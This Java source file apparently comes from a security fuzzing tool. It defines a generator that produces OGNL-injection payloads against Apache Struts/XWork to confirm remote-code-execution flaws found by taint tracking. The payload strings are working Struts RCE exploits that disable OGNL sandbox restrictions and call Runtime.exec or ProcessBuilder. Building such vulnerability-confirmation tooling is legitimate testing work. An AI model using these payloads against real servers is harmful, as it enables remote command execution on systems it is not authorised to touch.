 package io.rivulet.internal.fuzz.generator;

 import io.rivulet.internal.rerun.ReplacementImplBuilder;
 import io.rivulet.internal.rerun.RequestRerunConfigBuilder;
 import io.rivulet.internal.rerun.RerunConfigBuilder;
 import io.rivulet.internal.rerun.SinglePayloadRerunConfigBuilder;
 import io.rivulet.internal.Violation;

 import java.util.Arrays;
import java.util.HashMap;

 public class OgnlInjectionGenerator extends RCEGenerator {

    private static final String MEMBER_ACCESS = "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS";
    private static final String EXEC = "@java.lang.Runtime@getRuntime().exec";

    public Iterable<? extends RerunConfigBuilder> generateRerunBuilders(Violation violation, Object receiver, Object[] arguments) {
        String template = "(#_='multipart/form-data').";
        template += String.format("(#dm=%s).(#_memberAccess?(#_memberAccess=#dm):", MEMBER_ACCESS);
        template += "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).";
        template += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).";
        template += "(#ognlUtil.getExcludedPackageNames().clear()).";
        template += "(#ognlUtil.getExcludedClasses().clear()).";
        template += "(#context.setMemberAccess(#dm))))";
        String command = String.format("(%s('%s'))", EXEC, EXEC_COMMAND);
        HashMap<String, String> commandMap = new HashMap<>();
        commandMap.put("command", EXEC_COMMAND);
        return Arrays.asList(
                new SinglePayloadRerunConfigBuilder(String.format("%c{%s.%s}", '%', template, command)),
                new SinglePayloadRerunConfigBuilder(String.format("${%s.%s}", template, command)),
                new RequestRerunConfigBuilder()
                        .queryReplacement(commandMap, true, false)
                        .addReplacementBuilder(
                                new ReplacementImplBuilder()
                                        .isPayload(true)
                                        .required(true)
                                        .value(String.format("#_memberAccess=%s,#xx=88,#rs=%s(#parameters.command[0]),#xx.toString.json", MEMBER_ACCESS, EXEC))
                        ),
                new SinglePayloadRerunConfigBuilder("redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}"),
                new SinglePayloadRerunConfigBuilder("redirect:%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}"),
                new SinglePayloadRerunConfigBuilder("method:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}"),
                new SinglePayloadRerunConfigBuilder("method:%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}"),
                new SinglePayloadRerunConfigBuilder("${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}"),
                new SinglePayloadRerunConfigBuilder("%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ls'})).start()}")
        );
    }

    @Override
    public boolean isApplicable(Violation violation) {
        return violation.getBaseSink().startsWith("com/opensymphony/xwork2/util/TextParseUtil") || violation.getBaseSink().startsWith("ognl/Ognl")
                || violation.getBaseSink().startsWith("com/opensymphony/xwork2/ognl/OgnlUtil");
    }
}
